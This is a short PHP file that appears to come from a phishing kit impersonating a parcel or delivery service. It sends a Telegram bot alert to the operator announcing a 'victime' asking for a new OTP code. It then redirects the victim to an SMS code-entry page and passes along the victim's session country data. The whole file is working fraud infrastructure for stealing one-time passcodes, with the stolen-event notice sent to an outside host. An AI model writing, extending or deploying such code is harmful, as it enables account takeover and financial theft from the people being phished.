<?php
include'../../evil_coder/Functions/Fuck-you.php'; 
include("../../config.php"); 
$token = "$botkey";
    $data = [
    'text' => '⚠️ VICTIME ASKING FOR NEW OTP CODE ⚠️',
    'chat_id' => $teleid,
    ];
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
	
    header("Location: ../../main/sms.php?inpost_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")

?>